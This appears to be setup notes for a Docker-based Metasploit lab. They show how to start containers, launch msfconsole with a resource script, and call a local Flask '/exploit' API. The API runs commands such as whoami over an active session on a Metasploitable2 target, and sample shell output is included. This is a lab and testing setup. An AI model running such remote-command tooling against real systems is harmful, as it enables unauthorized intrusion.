# If containers are running:
    docker compose down --remove-orphans

# Build and Start All Containers (might have to run this multiple times to go through)
docker compose up -d --build

# Check the status of all containers to confirm they’re up:
docker ps

# Enter the operator container:
docker exec -it operator /bin/bash

# Once inside, start msfconsole with the required configuration file:
msfconsole -r /usr/src/metasploit-framework/docker/msfconsole.rc

# In a separate terminal, check the logs for eshu to ensure the Flask app started successfully (make sure you're within the improvedOp directory):
docker logs eshu

# Look for a line like this to confirm it’s listening on 10.1.1.99:5000:
 * Running on http://10.1.1.99:5000

# Once eshu is confirmed to be running, open a new terminal and run:
curl.exe -X POST http://localhost:5000/exploit -H "Content-Type: application/json" -d '{\"commands\": [\"whoami\", \"uname -a\", \"ls -la\"]}'

# You should see:
{
    "status": "Commands executed",
    "session_id": "1",
    "output": {
        "whoami": "msfadmin",
        "uname -a": "Linux metasploitable2 5.15.153.1-microsoft-standard-WSL2 #1 SMP Fri Mar 29 23:14:13 UTC 2024 x86_64 GNU/Linux",
        "ls -la": "total 28\ndrwxr-xr-x 5 msfadmin msfadmin 4096 2017-04-11 06:53 .\ndrwxr-xr-x 6 root     root     4096 2010-04-16 02:16 ..\nlrwxrwxrwx 1 root     root        9 2012-05-14 00:26 .bash_history -> /dev/null\ndrwxr-xr-x 4 msfadmin msfadmin 4096 2010-04-17 14:11 .distcc\n-rw-r--r-- 1 msfadmin msfadmin  586 2010-03-16 19:12 .profile\n-rwx------ 1 msfadmin msfadmin    4 2012-05-20 14:22 .rhosts\ndrwx------ 2 msfadmin msfadmin 4096 2010-05-17 21:43 .ssh\n-rw-r--r-- 1 msfadmin msfadmin    0 2017-04-11 06:53 .sudo_as_admin_successful\ndrwxr-xr-x 6 msfadmin msfadmin 4096 2010-04-27 23:44 vulnerable"
    }
}
# You can interact with the active SSH session from msfconsole by running:
sessions